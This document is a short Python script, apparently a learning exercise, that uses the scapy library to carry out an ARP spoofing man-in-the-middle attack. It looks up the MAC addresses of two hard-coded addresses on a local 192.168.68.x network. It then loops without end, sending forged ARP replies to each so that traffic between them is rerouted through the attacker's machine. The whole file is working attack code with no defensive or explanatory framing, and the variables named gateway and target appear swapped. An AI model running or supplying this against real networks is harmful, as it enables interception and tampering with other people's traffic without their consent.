import scapy.all as scapy

def spoof(target_ip, target_mac, spoof_ip):
    spoofed_arp_packet = scapy.ARP(pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, op = "is-at")
    scapy.send(spoofed_arp_packet, verbose = 0)

def get_mac(ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    reply, thing =scapy.srp(arp_request, timeout = 3, verbose = 0)
    if reply:
        return reply[0][1].src
    return None

def wait_till_nac_found(ip):
    mac = None
    while not mac:
        mac = get_mac(ip)
        if not mac:
            print("MAC address for {} not found \n".format(ip))
    return mac
    

gateway_ip = "192.168.68.118"
target_ip = "192.168.68.1"

target_mac = wait_till_nac_found(target_ip)
gateway_mac = wait_till_nac_found(gateway_ip)

while True:
    spoof(target_ip = target_ip, target_mac = target_mac, spoof_ip = gateway_ip)
    spoof(target_ip = gateway_ip, target_mac = gateway_mac, spoof_ip=target_ip)
    print("Spoofing is active")